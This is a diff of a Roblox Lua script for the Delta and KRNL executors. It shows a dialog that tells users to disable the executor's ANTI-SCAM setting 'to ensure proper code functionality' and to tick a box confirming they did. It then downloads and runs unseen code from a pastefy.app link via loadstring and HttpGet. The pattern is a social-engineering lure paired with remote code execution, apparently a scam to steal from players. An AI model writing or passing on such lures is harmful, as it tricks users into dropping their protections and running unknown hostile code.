@@ -1,56 +1,61 @@
 --// Detect Executor
 local executor = identifyexecutor and identifyexecutor():lower() or "unknown"
-
--- Show GUI only for Delta or KRNL users
-if executor ~= "delta" and executor ~= "krnl" then
-    return -- silently exit this UI logic
-end
+if executor ~= "delta" and executor ~= "krnl" then return end
 
 --// Roblox Services
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- Create ScreenGui
+--// GUI Setup
 local screenGui = Instance.new("ScreenGui", PlayerGui)
 screenGui.Name = "AntiScamPrompt"
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.ResetOnSpawn = false
 
--- Frame
+-- Main Frame
 local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 350, 0, 220)
-frame.Position = UDim2.new(0.5, -175, 0.5, -110)
-frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.Size = UDim2.new(0, 370, 0, 240)
+frame.Position = UDim2.new(0.5, -185, 0.5, -120)
+frame.BackgroundColor3 = Color3.fromRGB(223, 247, 221)
 frame.BorderSizePixel = 0
 
--- Title
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, 0, 0, 50)
-title.BackgroundTransparency = 1
-title.Text = "DISABLE ANTI-SCAM"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 22
+-- Header Frame
+local header = Instance.new("Frame", frame)
+header.Size = UDim2.new(1, 0, 0, 50)
+header.BackgroundColor3 = Color3.fromRGB(192, 235, 180)
 
--- Description (Changes per executor)
+-- Header Text
+local headerText = Instance.new("TextLabel", header)
+headerText.Size = UDim2.new(1, 0, 1, 0)
+headerText.Position = UDim2.new(0, 0, 0, 0)
+headerText.BackgroundTransparency = 1
+headerText.Text = executor == "krnl" and "FOR KRNL USERS" or "FOR DELTA USERS"
+headerText.TextColor3 = Color3.fromRGB(34, 80, 34)
+headerText.Font = Enum.Font.GothamBold
+headerText.TextSize = 20
+headerText.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Instruction Label
 local desc = Instance.new("TextLabel", frame)
 desc.Position = UDim2.new(0, 0, 0, 60)
-desc.Size = UDim2.new(1, 0, 0, 60)
+desc.Size = UDim2.new(1, 0, 0, 40)
 desc.BackgroundTransparency = 1
 desc.TextWrapped = true
 desc.Text = executor == "krnl"
-    and "Disable ANTI-SCAM in KRNL settings to ensure proper code functionality"
-    or "Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
-desc.TextColor3 = Color3.fromRGB(255, 150, 150)
+    and " Disable ANTI-SCAM in KRNL settings to ensure proper code functionality"
+    or " Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
+desc.TextColor3 = Color3.fromRGB(60, 60, 60)
 desc.Font = Enum.Font.Gotham
-desc.TextSize = 16
+desc.TextSize = 14
 
 -- Checkbox
 local checkbox = Instance.new("TextButton", frame)
-checkbox.Position = UDim2.new(0, 20, 0, 130)
+checkbox.Position = UDim2.new(0, 20, 0, 120)
 checkbox.Size = UDim2.new(0, 24, 0, 24)
 checkbox.Text = ""
-checkbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-checkbox.BorderColor3 = Color3.fromRGB(100, 100, 100)
+checkbox.BackgroundColor3 = Color3.fromRGB(240, 255, 240)
+checkbox.BorderColor3 = Color3.fromRGB(170, 220, 170)
 
 local checked = false
 checkbox.MouseButton1Click:Connect(function()
@@ -58,37 +63,38 @@ checkbox.MouseButton1Click:Connect(function()
     checkbox.Text = checked and "✓" or ""
 end)
 
--- Label next to checkbox
+-- Checkbox Label
 local label = Instance.new("TextLabel", frame)
-label.Position = UDim2.new(0, 50, 0, 130)
+label.Position = UDim2.new(0, 50, 0, 120)
 label.Size = UDim2.new(1, -50, 0, 24)
 label.BackgroundTransparency = 1
 label.Text = "I already disabled ANTI SCAM"
-label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextColor3 = Color3.fromRGB(60, 60, 60)
 label.Font = Enum.Font.Gotham
-label.TextSize = 16
+label.TextSize = 14
 label.TextXAlignment = Enum.TextXAlignment.Left
 
 -- Proceed Button
 local proceed = Instance.new("TextButton", frame)
-proceed.Position = UDim2.new(0.5, -75, 1, -50)
+proceed.Position = UDim2.new(0.5, -75, 1, -60)
 proceed.Size = UDim2.new(0, 150, 0, 40)
-proceed.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+proceed.BackgroundColor3 = Color3.fromRGB(120, 180, 120)
 proceed.Text = "PROCEED"
 proceed.TextColor3 = Color3.fromRGB(255, 255, 255)
 proceed.Font = Enum.Font.GothamBold
-proceed.TextSize = 18
+proceed.TextSize = 16
 
 -- Proceed Logic
 proceed.MouseButton1Click:Connect(function()
     if not checked then
-        proceed.Text = "Please check the box"
+        proceed.Text = "Please check box"
         wait(1)
         proceed.Text = "PROCEED"
-    else
-        screenGui:Destroy()
-
-        --// 🔥 Actual Script Starts Here 🔥
-        loadstring(game:HttpGet("https://pastefy.app/vH8EsPvd/raw"))()
+        return
     end
+
+    screenGui:Destroy()
+
+    --// 🔥 Actual Script Starts
+    loadstring(game:HttpGet("https://pastefy.app/vH8EsPvd/raw"))()
 end)
